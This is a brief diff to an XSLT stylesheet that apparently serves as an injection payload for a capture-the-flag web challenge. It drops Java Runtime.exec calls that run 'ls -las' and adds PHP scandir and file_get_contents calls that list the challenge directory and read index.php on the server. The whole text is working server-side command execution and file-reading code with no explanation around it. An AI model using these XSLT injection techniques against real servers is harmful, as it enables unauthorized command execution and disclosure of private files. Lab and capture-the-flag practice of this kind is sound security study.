@@ -6,12 +6,10 @@
       xmlns:process="java:java.lang.Process" 
     extension-element-prefixes="exsl" xsl:version="1.0"> 
 <body style="font-family:Arial;font-size:9pt;background-color:#AABBCC">
-<xsl:variable name="rtobject" select="runtime:getRuntime()"/> 
-<xsl:variable name="process" select="runtime:exec($rtobject,'ls -las')"/> 
-<xsl:variable name="waiting" select="process:waitFor($process)"/> 
-<xsl:value-of select="$process"/>
     
-<xsl:variable  name="scand"   select="php:function('scandir','/challenge/web-serveur/ch50')" mode="serialize" />
+<xsl:for-each  name="scand"   select="php:function('scandir','/challenge/web-serveur/ch50')" mode="serialize" >
+ <xsl:value-of select="."/> 
+</xsl:for-each>      
 <xsl:variable  name="header"  select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')"/>
 <xsl:for-each select="beers/beer">
 <div style="background-color:teal;color:white;padding:4px">
